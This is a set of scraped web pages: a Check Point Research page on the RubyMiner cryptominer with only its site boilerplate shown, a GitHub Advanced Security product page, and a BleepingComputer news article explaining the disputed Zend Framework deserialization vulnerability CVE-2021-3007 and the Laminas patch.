* Check Point Research Publications

January 11, 2018
### ‘RubyMiner’ Cryptominer Affects 30% of WW Networks

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/CheckPointResearchLogo_white-1-e1671590634727.png)](https://research.checkpoint.com)

* Publications
  + [Global cyber attack reports](/category/threat-intelligence-reports/)
  + [Research publications](/category/threat-research/)
  + [IPS advisories](https://advisories.checkpoint.com/advisories/)
  + [Check point blog](https://blog.checkpoint.com/)
  + [Demos](/category/demos/)
* Tools
  + [Sandblast file analysis](http://threatemulation.checkpoint.com/)
  + [ThreatCloud](https://www.checkpoint.com/infinity/threatcloud/)
  + [Threat Intelligence](https://www.checkpoint.com/solutions/threat-intelligence-research/)
  + [Zero day protection](https://www.checkpoint.com/infinity/zero-day-protection/)
  + [Live threat map](https://threatmap.checkpoint.com/)
* [About Us](https://research.checkpoint.com/about-us/)
  + [Contact Us](https://research.checkpoint.com/contact/)

### Let’s get in touch

Subscribe for cpr blogs, news and more

[Subscribe Now](/subscription/)

© 1994-2024 Check Point Software Technologies LTD. All rights reserved.

Property of [CheckPoint.com](https://www.checkpoint.com/)

[Privacy Policy](/privacy-policy/)

![](https://research.checkpoint.com/wp-content/uploads/2022/10/popup-side-image.jpg)

## SUBSCRIBE TO CYBER INTELLIGENCE REPORTS

First Name

Last Name

Country—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK)

Email

## We value your privacy!

BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.

ACCEPT
REJECT



=== Content from github.com_a1b59367_20250115_200920.html ===

[Skip to content](#start-of-content)

GitHub Copilot is now available for free.
[Learn more](https://github.com/features/copilot/?utm_source=github&utm_medium=banner&utm_campaign=copilotfree-bannerheader-features-security)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffeatures%2Fsecurity)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffeatures%2Fsecurity)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Ffeatures%2Fsecurity&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Security](https://github.com/features/security)

* [Code scanning](https://github.com/features/security/code-scanning)
* [Supply chain](https://github.com/features/security/software-supply-chain)
![](//images.ctfassets.net/8aevphvgewt8/2YymXxRoWDQjhmQOOwzzqO/251bd0e39fcdc255abf2a1885aa58d7f/Hero_BG.webp?w=2400&fm=jpg&fl=progressive)GitHub Security
# Security at every step

AI-powered native application security testing

[Contact sales](https://github.com/enterprise/contact?ref_cta=Contact+Sales&ref_loc=hero&ref_page=%2Ffeatures%2Fsecurity&scid=&utm_campaign=adv-security&utm_content=Security&utm_medium=site&utm_source=github)[Request a demo](https://resources.github.com/demo/advanced-security/)
### Enterprise-Grade

Secure your public and private repositories and leverage the power of Copilot

[GitHub Advanced Security](https://github.com/enterprise/advanced-security)
### Powering DevSecOps

Leverage automation and AI to help your developers ship secure code

[Get the checklist](https://resources.github.com/security/ai-powered-devsecops-checklist/)
### Security at Scale

Learn how a global consulting firm automates security testing for 12K developers

[Read the customer story](https://github.com/customer-stories/accenture)
### Find and fix vulnerabilities 7x faster

With AI-powered application security testing tools embedded in your development workflow, GitHub Advanced Security outperforms non-native add-ons by delivering 7x faster remediation rates for identified vulnerabilities.

[Secure your code](https://github.com/features/security/code-scanning) ![Build with 3 steps showing green circles with checkmarks](//images.ctfassets.net/8aevphvgewt8/5yPX48aDjvoLk4kFmITU4l/9b668b6b1bbcbf3bfffeae7929933f43/Security_workflow.webp)
### vs code

![](//images.ctfassets.net/8aevphvgewt8/7sE2CIxJtah2hxz17SuK2q/ffbabcdf221e48600cd9d6e97752e068/Security_codespaces.webp)

*Find vulnerabilities and suppress false positives* with more than 2,000 queries from GitHub and the open-source community.

[Learn more about CodeQL](https://github.blog/2023-03-31-codeql-zero-to-hero-part-1-the-fundamentals-of-static-analysis-for-vulnerability-research/)

* Leverage machine learning to detect security issues in your pull requests and prevent new vulnerabilities from entering main.
* Prioritize alerts and view exposure across the codebase to make sure you focus on what matters. Automatically resolve alerts with AI-powered auto-remediation.
### Software supply chains, secure by design

GitHub supply chain security is designed for developers, built for speed, and free for everyone. All powered by a database of over 12,000 expert-reviewed advisories.

[Secure your software supply chain](https://github.com/features/security/software-supply-chain)![List of dependencies defined in pypi/requirements.txt](//images.ctfassets.net/8aevphvgewt8/7hZcMpJI3S9NWgxOcISlSR/b15c3ac2ab1ac68c6d8ba68fdd6b9192/Security_dependencies.webp)
### Detect and prevent secret leaks

Keep secrets out of your code with secret scanning and push protection, built on the foundation of 100+ partners and 200+ token types. Create custom patterns and detect leaked passwords, powered by AI.

[Secret scanning is now free for all public repositories](https://github.blog/2023-02-28-secret-scanning-alerts-are-now-available-and-free-for-all-public-repositories/)![Active secret detected and remediation steps](//images.ctfassets.net/8aevphvgewt8/2duivPWNVDHSVaRJlCVLcW/d691b081ad0fc3ac19934567bb2b4b3b/Security_secret.webp)
### Complete visibility into your enterprise

Security overview provides a cross-organizational view of security issues and trends so that you can focus on prioritizing remediation efforts and track progress over time.

[Explore GitHub Enterprise](http://www.github.com/enterprise)![](//images.ctfassets.net/8aevphvgewt8/5h3WqpvxE1NWcKK8FYjKVK/10395fe64dc2bb86738381ae6745640b/Security_visibility.webp)
### Be part of the world’s largest security community

Report security issues, share security knowledge and grow with the community. Contribute to open source code scanning queries written by GitHub and leading security researchers.

[Publish a repository security advisory](https://securitylab.github.com/)![](//images.ctfassets.net/8aevphvgewt8/39nUwrwKIu2DWMGKkXRyau/3340814471daa813b0fb9ddacf4135ba/Security_community.webp)
### Security at every step

AI-powered native application security testing

[Contact sales](https://github.com/enterprise/contact?ref_cta=Contact+Sales&ref_loc=cta%2Fbanner&ref_page=%2Ffeatures%2Fsecurity&scid=&utm_campaign=adv-security&utm_content=Security&utm_medium=site&utm_source=github)[Request a demo](https://resources.github.com/demo/advanced-security/)
### Best practices for more secure software

### [Developer-first application security](https://resources.github.com/security/supply-chain/shipping-fast-secure-supply-chain/)

Take an in-depth look at the current state of application security.

Learn more
### [Proactive vs Reactive Security](https://resources.github.com/security/proactive-security/)

Prevent security issues from happening in the first place.

Prevent security issues
### [Static application security testing SAST](https://resources.github.com/security/sast/)

Discover what SAST is and how to get started with SAST.

Learn more about SAST

## Site-wide Links

### Subscribe to our developer newsletter

Get tips, technical guides, and best practices. Twice a month. Right in your inbox.

[Subscribe](https://resources.github.com/newsletter/)

### Product

* [Features](/features)
* [Enterprise](/enterprise)
* [Copilot](/features/copilot)
* [Security](/security)
* [Pricing](/pricing)
* [Team](/team)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare)

### Platform

* [Developer API](https://docs.github.com/get-started/exploring-integrations/about-building-integrations)
* [Partners](https://partner.github.com)
* [Education](https://github.com/edu)
* [GitHub CLI](https://cli.github.com)
* [GitHub Desktop](https://desktop.github.com)
* [GitHub Mobile](https://github.com/mobile)

### Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com)
* [Premium Support](/enterprise/premium-support)
* [Skills](https://skills.github.com)
* [Status](https://www.githubstatus.com)
* [Contact GitHub](https://support.github.com?tags=dotcom-footer)

### Company

* [About](https://github.com/about)
* [Customer stories](/customer-stories?type=enterprise)
* [Blog](https://github.blog)
* [The ReadME Project](/readme)
* [Careers](https://github.careers)
* [Newsroom](/newsroom)
* [Inclusion](/about/diversity)
* [Social Impact](https://socialimpact.github.com)
* [Shop](https://shop.github.com)

* © 2025 GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
  ([Updated 02/2024](https://github.com/github/site-policy/pull/582))
* [Sitemap](/sitemap)
* [What is Git?](/git-guides)
* Manage cookies
* Do not share my personal information

* [GitHub on LinkedIn](https://www.linkedin.com/company/github)
* [Instagram
  GitHub on Instagram](https://www.instagram.com/github)
* [GitHub on YouTube](https://www.youtube.com/github)
* [GitHub on X](https://x.com/github)
* [TikTok
  GitHub on TikTok](https://www.tiktok.com/%40github)
* [Twitch
  GitHub on Twitch](https://www.twitch.tv/github)
* [GitHub’s organization on GitHub](https://github.com/github)

You can’t perform that action at this time.



=== Content from www.bleepingcomputer.com_44ce4dcd_20250115_200933.html ===


[![BleepingComputer.com logo](https://www.bleepstatic.com/images/site/logo.png)](https://www.bleepingcomputer.com/)

* [News](https://www.bleepingcomputer.com/)
  + [Featured](#nfeatured)
  + [Latest](#nlatest)
  + [![Microsoft January 2025 Patch Tuesday fixes 8 zero-days, 159 flaws](data:image/gif;base64...)

    Microsoft January 2025 Patch Tuesday fixes 8 zero-days, 159 flaws](https://www.bleepingcomputer.com/news/microsoft/microsoft-january-2025-patch-tuesday-fixes-8-zero-days-159-flaws/)
  + [![FBI deletes Chinese PlugX malware from thousands of US computers](data:image/gif;base64...)

    FBI deletes Chinese PlugX malware from thousands of US computers](https://www.bleepingcomputer.com/news/security/fbi-deletes-chinese-plugx-malware-from-thousands-of-us-computers/)
  + [![Fortinet warns of auth bypass zero-day exploited to hijack firewalls](data:image/gif;base64...)

    Fortinet warns of auth bypass zero-day exploited to hijack firewalls](https://www.bleepingcomputer.com/news/security/fortinet-warns-of-auth-bypass-zero-day-exploited-to-hijack-firewalls/)
  + [![Hackers use FastHTTP in new high-speed Microsoft 365 password attacks](data:image/gif;base64...)

    Hackers use FastHTTP in new high-speed Microsoft 365 password attacks](https://www.bleepingcomputer.com/news/security/hackers-use-fasthttp-in-new-high-speed-microsoft-365-password-attacks/)
  + [![Label giant Avery says website hacked to steal credit cards](data:image/gif;base64...)

    Label giant Avery says website hacked to steal credit cards](https://www.bleepingcomputer.com/news/security/label-giant-avery-says-website-hacked-to-steal-credit-cards/)
  + [![The A to Z of cybersecurity in one affordable bundle](data:image/gif;base64...)

    The A to Z of cybersecurity in one affordable bundle](https://www.bleepingcomputer.com/offer/deals/the-a-to-z-of-cybersecurity-in-one-affordable-bundle/)
  + [![Hackers use Google Search ads to steal Google Ads accounts](data:image/gif;base64...)

    Hackers use Google Search ads to steal Google Ads accounts](https://www.bleepingcomputer.com/news/security/hackers-use-google-search-ads-to-steal-google-ads-accounts/)
  + [![Microsoft ends support for Office apps on Windows 10 in October](data:image/gif;base64...)

    Microsoft ends support for Office apps on Windows 10 in October](https://www.bleepingcomputer.com/news/microsoft/microsoft-ends-support-for-office-apps-on-windows-10-in-october/)
* [Tutorials](https://www.bleepingcomputer.com/tutorials/)
  + [Latest](#tlatest)
  + [Popular](#popular)
  + [![How to access the Dark Web using the Tor Browser](data:image/gif;base64...)

    How to access the Dark Web using the Tor Browser](/tutorials/how-to-access-the-dark-web-using-the-tor-browser/)
  + [![How to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11](data:image/gif;base64...)

    How to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11](/tutorials/how-to-enable-kernel-mode-hardware-enforced-stack-protection-in-windows-11/)
  + [![How to use the Windows Registry Editor](data:image/gif;base64...)

    How to use the Windows Registry Editor](/tutorials/how-to-use-the-windows-registry-editor/)
  + [![How to backup and restore the Windows Registry](data:image/gif;base64...)

    How to backup and restore the Windows Registry](/tutorials/how-to-backup-and-restore-the-windows-registry/)
  + [![How to start Windows in Safe Mode](data:image/gif;base64...)

    How to start Windows in Safe Mode](/tutorials/how-to-start-windows-in-safe-mode/)
  + [![How to remove a Trojan, Virus, Worm, or other Malware](data:image/gif;base64...)

    How to remove a Trojan, Virus, Worm, or other Malware](/tutorials/how-to-remove-a-trojan-virus-worm-or-malware/)
  + [![How to show hidden files in Windows 7](data:image/gif;base64...)

    How to show hidden files in Windows 7](/tutorials/show-hidden-files-in-windows-7/)
  + [![How to see hidden files in Windows](data:image/gif;base64...)

    How to see hidden files in Windows](/tutorials/how-to-see-hidden-files-in-windows/)
* [Virus Removal Guides](https://www.bleepingcomputer.com/virus-removal/)
  + [Latest](#vlatest)
  + [Most Viewed](#vmost)
  + [Ransomware](#ransomware)
  + [![Remove the Theonlinesearch.com Search Redirect](data:image/gif;base64...)

    Remove the Theonlinesearch.com Search Redirect](/virus-removal/remove-theonlinesearch.com-search-redirect)
  + [![Remove the Smartwebfinder.com Search Redirect](data:image/gif;base64...)

    Remove the Smartwebfinder.com Search Redirect](/virus-removal/remove-smartwebfinder.com-search-redirect)
  + [![How to remove the PBlock+ adware browser extension](data:image/gif;base64...)

    How to remove the PBlock+ adware browser extension](/virus-removal/how-to-remove-the-pblock-adware-extension)
  + [![Remove the Toksearches.xyz Search Redirect](data:image/gif;base64...)

    Remove the Toksearches.xyz Search Redirect](/virus-removal/remove-toksearches.xyz-search-redirect)
  + [![Remove Security Tool and SecurityTool (Uninstall Guide)](data:image/gif;base64...)

    Remove Security Tool and SecurityTool (Uninstall Guide)](/virus-removal/remove-security-tool)
  + [![How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundo](data:image/gif;base64...)

    How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundo](/virus-removal/remove-vundo-virtumonde)
  + [![How to remove Antivirus 2009 (Uninstall Instructions)](data:image/gif;base64...)

    How to remove Antivirus 2009 (Uninstall Instructions)](/virus-removal/uninstall-antivirus-2009)
  + [![How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKiller](data:image/gif;base64...)

    How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKiller](/virus-removal/remove-tdss-tdl3-alureon-rootkit-using-tdsskiller)
  + [![Locky Ransomware Information, Help Guide, and FAQ](data:image/gif;base64...)

    Locky Ransomware Information, Help Guide, and FAQ](/virus-removal/locky-ransomware-information-help)
  + [![CryptoLocker Ransomware Information Guide and FAQ](data:image/gif;base64...)

    CryptoLocker Ransomware Information Guide and FAQ](/virus-removal/cryptolocker-ransomware-information)
  + [![CryptorBit and HowDecrypt Information Guide and FAQ](data:image/gif;base64...)

    CryptorBit and HowDecrypt Information Guide and FAQ](/virus-removal/cryptorbit-ransomware-information)
  + [![CryptoDefense and How_Decrypt Ransomware Information Guide and FAQ](data:image/gif;base64...)

    CryptoDefense and How\_Decrypt Ransomware Information Guide and FAQ](/virus-removal/cryptodefense-ransomware-information)
* [Downloads](https://www.bleepingcomputer.com/download/)
  + [Latest](#dlatest)
  + [Most Downloaded](#most)
  + [![Qualys BrowserCheck](data:image/gif;base64...)

    Qualys BrowserCheck](https://www.bleepingcomputer.com/download/qualys-browsercheck/)
  + [![STOPDecrypter](data:image/gif;base64...)

    STOPDecrypter](https://www.bleepingcomputer.com/download/stopdecrypter/)
  + [![AuroraDecrypter](data:image/gif;base64...)

    AuroraDecrypter](https://www.bleepingcomputer.com/download/auroradecrypter/)
  + [![FilesLockerDecrypter](data:image/gif;base64...)

    FilesLockerDecrypter](https://www.bleepingcomputer.com/download/fileslockerdecrypter/)
  + [![AdwCleaner](data:image/gif;base64...)

    AdwCleaner](/download/adwcleaner/)
  + [![ComboFix](data:image/gif;base64...)

    ComboFix](/download/combofix/)
  + [![RKill](data:image/gif;base64...)

    RKill](/download/rkill/)
  + [![Junkware Removal Tool](data:image/gif;base64...)

    Junkware Removal Tool](/download/junkware-removal-tool/)
* [Deals](https://deals.bleepingcomputer.com/)
  + [Categories](#dcategories)
  + [![eLearning](data:image/gif;base64...)

    eLearning](https://deals.bleepingcomputer.com/deals/elearning?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![IT Certification Courses](data:image/gif;base64...)

    IT Certification Courses](https://deals.bleepingcomputer.com/deals/certifications?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![Gear & Gadgets](data:image/gif;base64...)

    Gear + Gadgets](https://deals.bleepingcomputer.com/deals/gear-gadgets?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![Security](data:image/gif;base64...)

    Security](https://deals.bleepingcomputer.com/collections/tag-cyber-security?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
* [VPNs](https://www.bleepingcomputer.com/vpn/)
  + [Popular](#vpopular)
  + [![Best VPNs](data:image/gif;base64...)

    Best VPNs](https://www.bleepingcomputer.com/vpn/guides/best-vpn/)
  + [![How to change IP address](data:image/gif;base64...)

    How to change IP address](https://www.bleepingcomputer.com/vpn/guides/change-ip-address/)
  + [![Access the dark web safely](data:image/gif;base64...)

    Access the dark web safely](https://www.bleepingcomputer.com/vpn/guides/access-dark-web-safely/)
  + [![Best VPN for YouTube](data:image/gif;base64...)

    Best VPN for YouTube](https://www.bleepingcomputer.com/vpn/guides/watch-youtube-tv-abroad-vpn/)
* [Forums](https://www.bleepingcomputer.com/forums/)
* More
  + [Startup Database](https://www.bleepingcomputer.com/startups/)
  + [Uninstall Database](https://www.bleepingcomputer.com/uninstall/)
  + [Glossary](https://www.bleepingcomputer.com/glossary/)
  + [Chat on Discord](https://www.bleepingcomputer.com/forums/t/730914/the-bleepingcomputer-official-discord-chat-server-come-join-the-fun/)
  + [Send us a Tip!](https://www.bleepingcomputer.com/news-tip/)
  + [Welcome Guide](https://www.bleepingcomputer.com/welcome-guide/)

* [Home](https://www.bleepingcomputer.com/)
* [News](https://www.bleepingcomputer.com/news/)
* [Security](https://www.bleepingcomputer.com/news/security/)
* Zend Framework disputes RCE vulnerability, issues patch

# Zend Framework disputes RCE vulnerability, issues patch

By
###### [Ax Sharma](https://www.bleepingcomputer.com/author/ax-sharma/)

* January 4, 2021
* 11:05 AM
* [6](#comments)

![Zend Framework background](https://www.bleepstatic.com/content/hl-images/2021/01/04/zend.jpg)

An untrusted deserialization vulnerability has been disclosed this week in how Zend Framework can be exploited by attackers to achieve remote code execution on vulnerable PHP sites.

This vulnerability tracked as CVE-2021-3007 may also impact apps built with Laminas Project, Zend's successor.

Zend Framework consists of PHP packages installed over **570 million** times. The framework is used by developers to build object-oriented web applications.

The project has now disputed the vulnerability due to the fact the exploitation requires vulnerable deserialization to take place within the developer's app. However, Laminas has still issued a patch to "tighten security" in its framework.

## From untrusted deserialization to RCE

This week, security researcher Ling Yizhou has disclosed how a particular gadget chain in Zend Framework 3.0.0 could be abused in untrusted deserialization attacks.

If exploited, the flaw could allow remote attackers to conduct remote code execution (RCE) attacks on vulnerable PHP applications under certain circumstances.

"Zend Framework 3.0.0 has a deserialization vulnerability that can lead to remote code execution if the content is controllable, related to the *\_\_destruct* method of the *Zend\Http\Response\Stream* class in *Stream.php*," states MITRE's advisory for [CVE-2021-3007](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3007).

**While the actual untrusted deserialization has to come from a vulnerable application and does not exist in Zend Framework itself, the chain of classes provided by Zend allows an attacker to achieve RCE.**

Untrusted deserialization vulnerabilities occur in applications when encoded data being received by the application from a user or a system is not properly validated before it is decoded by the application.

A vulnerable application may deserialize and process the received data of an improper format, which can have consequences ranging from application crashes (Denial of Service) to the attacker being able to run arbitrary commands in the context of the application.

In the case of Zend, the vulnerability stems from the destructor of the *Stream* class which is a PHP [magic method](https://www.php.net/manual/en/language.oop5.magic.php).

In object-oriented programming, constructors and destructors are methods that are respectively called when a new class object is created and destroyed.

For example, a newly created *Stream* object, in this case, would run a series of commands at its conception via the *constructor*.

Once the object has served its purpose throughout the program execution workflow, the PHP interpreter will eventually call the object's destructor and follow another sequence of commands to free up memory, perform cleanup tasks and delete any temporary files, as a good practice.

Yizhou [points out](https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md) the *unlink()* method called by *Stream's*destructor for deleting a file expects a filename as a parameter, which is of the *string* data type.

![Zend Framework CVE-2021-3007 vulnerable destructor](https://www.bleepstatic.com/images/news/u/1164866/2021/Jan%202021/zend%20laminas/destructor_laminas.png)

**Vulnerable destructor in Zend Framework and Laminas Project**

Source: [GitHub](https://github.com/laminas/laminas-http/blob/2.15.x/src/Response/Stream.php#L285)

In effect, should the *streamName* object be of a non-string type, at the end of the application execution it would still get passed to the destructor.

The destructor, which only expects a string value would therefore attempt to call the object's *\_\_toString* method, to get its string-equivalent value.

But, the *\_\_toString* method can be easily customized by the creator of the object, or rather the creator of the *class* that the object instantiates.

As an example, Yizhou highlighted the *\_\_toString* method in the *Gravatar* class of Zend Framework had been written by its programmers in such a way that it eventually returned values that the attacker had direct control over, to execute arbitrary code.

This means, should the *Stream* class be passed a *Gravator*object where *streamName* is expected, under certain circumstances, the threat actor could run arbitrary commands within vulnerable PHP applications built with Zend.

The researcher demonstrated at least 2 scenarios in which it was possible to pass serialized objects to Zend, which when parsed by the PHP application would render the output of attacker's the commands on the rendered webpages.

In a proof-of-concept (PoC) exploit, the researcher demonstrated how the web app's *phpinfo* page successfully parsed his system command "whoami" passed through a serialized HTTP request, and returned the Windows account name, "nt authority\system."

![whoami command output zend framework vulnerability](https://www.bleepstatic.com/images/news/u/1164866/2021/Jan%202021/zend%20laminas/whoami_zend_framework.png)

**Researcher ran "whoami" command successfully in a demo PoC and obtained "nt authority\system" output**

Source: Yizhou

## Apps built with Laminas may also be impacted

In January 2020, Zend Framework was [migrated](https://framework.zend.com/blog/2020-01-24-laminas-launch) to Laminas project with a significant amount of code simply having been relocated to the newer codebase.

For example, Zend's [*Stream.php*](https://github.com/laminas/laminas-http/commits/2.15.x/src/Response/Stream.php) class with the aforementioned destructor continues to exist in some versions of Laminas.

"The code may be related to Laminas Project *laminas-http*. Zend Framework is no longer supported by the maintainer. However, not all Zend Framework 3.0.0 vulnerabilities exist in a Laminas Project release," states MITRE's advisory.

While this does not necessarily indicate all applications built with Laminas project are vulnerable, developers are advised to do their due diligence.

Considering PHP powers [about 80% of the internet sites](https://w3techs.com/technologies/details/pl-php) in some capacity, and given the historic popularity of Zend Framework, developers are advised to thoroughly check their web applications for cases of untrusted object deserialization.

A similar gadget chain has been found in [Yii Framework](https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/) this week which the attackers can use to target vulnerable applications.

Performing thorough security audits of your applications is one way to spot zero-days and vulnerabilities specific to your environment from time to time.

**Update 5-Jan-2021:**Clarified the gadget chain in Zend Framework may aid in achieving RCE for an application vulnerable to untrusted deserialization.

Laminas Project has issued a minor security [patch](https://github.com/laminas/laminas-http/pull/48) on GitHub to update the aforementioned destructor in *Stream* class, while disputing the CVE reported by Yizhou.

The project's reasons for disputing the vulnerability and issuing a security enhancement have been outlined in the [comments](https://www.bleepingcomputer.com/news/security/zend-framework-remote-code-execution-vulnerability-revealed/#cid17822) section below.

### Related Articles:

[Over 660,000 Rsync servers exposed to code execution attacks](https://www.bleepingcomputer.com/news/security/over-660-000-rsync-servers-exposed-to-code-execution-attacks/)

[Ivanti warns of new Connect Secure flaw used in zero-day attacks](https://www.bleepingcomputer.com/news/security/ivanti-warns-of-new-connect-secure-flaw-used-in-zero-day-attacks/)

[Unpatched critical flaws impact Fancy Product Designer WordPress plugin](https://www.bleepingcomputer.com/news/security/unpatched-critical-flaws-impact-fancy-product-designer-wordpress-plugin/)

[Apache warns of critical flaws in MINA, HugeGraph, Traffic Control](https://www.bleepingcomputer.com/news/security/apache-warns-of-critical-flaws-in-mina-hugegraph-traffic-control/)

[Apache fixes remote code execution bypass in Tomcat web server](https://www.bleepingcomputer.com/news/security/apache-fixes-remote-code-execution-bypass-in-tomcat-web-server/)

* [Code Injection](https://www.bleepingcomputer.com/tag/code-injection/)
* [PHP](https://www.bleepingcomputer.com/tag/php/)
* [Remote Code Execution](https://www.bleepingcomputer.com/tag/remote-code-execution/)
* [Severity](https://www.bleepingcomputer.com/tag/severity/)
* [Vulnerability](https://www.bleepingcomputer.com/tag/vulnerability/)

##### [Ax Sharma](https://www.bleepingcomputer.com/author/ax-sharma/)

